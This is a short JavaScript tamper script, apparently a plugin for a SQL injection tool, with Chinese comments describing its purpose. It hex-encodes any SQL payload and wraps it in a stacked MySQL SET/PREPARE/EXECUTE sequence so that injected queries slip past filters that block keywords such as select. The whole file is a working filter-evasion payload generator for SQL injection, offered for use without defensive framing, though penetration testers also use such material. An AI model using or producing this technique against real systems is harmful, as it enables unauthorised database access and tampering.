//@name: Hex预编译堆叠
//@usage: payload
//@enable: false
//@description: 整段SQL转hex套MySQL预编译执行（;SET @s=0x..;PREPARE..;EXECUTE..，堆叠通道专用，逃逸select等关键字整串过滤）
function utf8bin(s){ return unescape(encodeURIComponent(s)); }
function tamper(payload){
    var bin = utf8bin(payload);
    var out = ';SET @s=0x';
    for (var i = 0; i < bin.length; i++){
        out += bin.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return out + ';PREPARE stmt FROM @s;EXECUTE stmt;';
}